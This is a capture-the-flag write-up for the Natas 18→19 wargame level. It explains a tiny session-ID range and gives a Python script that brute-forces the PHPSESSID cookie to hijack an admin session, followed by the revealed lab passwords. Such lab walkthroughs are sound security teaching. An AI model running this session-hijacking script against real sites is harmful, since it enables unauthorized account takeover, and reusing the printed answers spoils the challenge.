# Natas Level 18 → Level 19

### Challenge

**URL: http://natas18.natas.labs.overthewire.org/**

This level introduces a vulnerability known as **Session Fixation** combined with weak **Session ID generation**.

Analyzing the provided source code, we find a critical flaw in how sessions are handled:

1. **Maximum ID Range:**

   ```
   $maxid = 640; // 640 should be enough for everyone
   ```

   The developer assumes that 640 session IDs are sufficient, which is an extremely small search space.

2. **Session Creation:**

   ```
   function createID($user) {
       global $maxid;
       return rand(1, $maxid);
   }
   ```

   When a user logs in, the `session_id` is set to a random integer between 1 and 640.

3. **The Goal:** The code checks if the session belongs to an admin:

   ```
   if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
       print "You are an admin...";
   }
   ```

**Vulnerability:** We do not need to log in via the form. We simply need to find an _existing_ active session ID (between 1 and 640) that belongs to an administrator. Since the range is so small, we can brute-force the `PHPSESSID` cookie.

---

### Walkthrough

1. The logic relies on the cookie `PHPSESSID`. If we send a request with `Cookie: PHPSESSID=1`, the server checks if session #1 is valid and if it is an admin.
2. We need to iterate through numbers 1 to 640. For each number, we send a request to the server with that number as the session cookie.
3. If the response contains the text "You are an admin", we have successfully hijacked the admin's session and retrieved the password.
4. Below is a Python script to automate this **Session ID Brute Force**:

   ```
   import requests

   target = "http://natas18.natas.labs.overthewire.org"
   auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ") # Password natas18
   headers = {"Content-Type": "application/x-www-form-urlencoded"}

   print("Brute forcing PHPSESSID (Range 1-640)...")

   # The source code defines $maxid = 640
   for i in range(1, 641):
       # Set the cookie for this attempt
       cookies = {"PHPSESSID": str(i)}

       try:
           r = requests.post(target, auth=auth, cookies=cookies, timeout=5)

           # Check if we hijacked the admin session
           if "You are an admin" in r.text:
               print(f"\n[+] Admin session found at PHPSESSID: {i}")

               # Extract the password roughly or print the content to see it
               # The password is usually inside <pre> tags
               content_lines = r.text.splitlines()
               for line in content_lines:
                   if "Password:" in line:
                       print(line.strip())
               break

           if i % 50 == 0:
               print(f"Checked {i} sessions...")

       except Exception as e:
           print(f"Error: {e}")

   print("Done.")
   ```

5. Run the script. It will rapidly test the cookies. Usually, the admin session is found correctly within a few seconds.

---

### Credentials Found

- **Username:** `natas19`
- **Password:** `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
